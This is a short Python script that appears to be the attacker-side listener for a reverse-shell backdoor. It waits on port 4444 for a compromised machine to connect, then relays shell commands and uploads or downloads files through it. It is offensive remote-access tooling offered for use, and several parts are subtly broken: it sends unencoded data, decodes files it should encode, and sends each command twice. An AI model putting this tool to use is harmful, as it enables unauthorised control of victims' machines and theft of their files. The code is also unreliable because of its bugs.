#!/usr/bin/env python
import base64
import socket
import json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        self.connection, address = listener.accept()
        print("[+] Connection initialized")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += str(self.connection.recv(1024))
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            return "[+] Download ended"

    def read_file(self, path):
        with open(path, "rb") as f:
            return base64.b64decode(f.read())

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        self.reliable_send(command)
        return self.reliable_receive()

    def run(self):
        while True:
            command = input()
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)
                if command[0] == "download" and "[-]" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] ERROR"
            print(result)

my_Listener = Listener("", 4444)
my_Listener.run()